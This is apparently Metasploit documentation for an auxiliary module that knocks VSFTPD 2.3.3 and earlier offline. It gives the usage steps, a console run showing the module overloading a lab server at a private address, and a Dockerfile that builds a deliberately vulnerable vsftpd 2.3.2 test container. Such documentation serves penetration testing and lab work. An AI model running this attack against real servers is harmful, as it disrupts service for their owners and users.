## Vulnerable Application

This is an auxiliary for DOSing a VSFTPD server from version 2.3.3 and below.

## Verification Steps

1. Start `msfconsole`
2. `use auxiliary/dos/ftp/vstfpd_232`
3. `set rhosts`
4. `set ftpuser`
5. `set ftppass`
6. `run`

## Scenarios

### VSFTPD 2.3.2 - Arch linux

```
msf6 > use auxiliary/dos/ftp/vsftpd_232
msf6 auxiliary(dos/ftp/vstfpd_232) > set rhosts 192.168.56.106
rhosts => 192.168.56.106
msf6 auxiliary(dos/ftp/vstfpd_232) > set ftpuser anonymous
ftpuser => anonymous
msf6 auxiliary(dos/ftp/vstfpd_232) > set ftppass ''
ftppass => 
msf6 auxiliary(dos/ftp/vstfpd_232) > run
[*] Running module against 192.168.56.106

[*] 192.168.56.106:21 - sending payload
.............................................................................................
[+] 192.168.56.106:21 - Stream was cut off abruptly. Appears DOS attack succeeded.
[*] Auxiliary module execution completed
```

You can verify that it works by either attempting to ftp into the machine after or checking htop on the machine. If the CPU is at max capacity, that would be due to the DOS.

## VSFTPD 2.3.2 - Arch Linux Docker

A simple container was created to easily test this vulnerability. To easily run a vulnerable instance of this application, build this image from this Dockerfile.

```dockerfile
FROM archlinux:latest as build
RUN pacman -Sy --noconfirm gcc make libnsl
RUN curl -O https://security.appspot.com/downloads/vsftpd-2.3.2.tar.gz
RUN tar zxf vsftpd-2.3.2.tar.gz
WORKDIR /vsftpd-2.3.2
RUN make
RUN mkdir -p /usr/share/empty/
RUN chmod +x /vsftpd-2.3.2/vsftpd
RUN mv /vsftpd-2.3.2/vsftpd /bin/vsftpd
RUN mv /vsftpd-2.3.2/vsftpd.conf /etc/vsftpd.conf
RUN chown root:root /etc/vsftpd.conf
EXPOSE 21
CMD [ "/bin/vsftpd" ]
```

From there, you can run the instance of the container with this line

```bash
sudo docker build -t vsftpd:2.3.2 .
sudo docker run --name vsftpd -p 21:21 vsftpd:2.3.2
```

Run the module against this container and the container will either slow down or crash entirely.
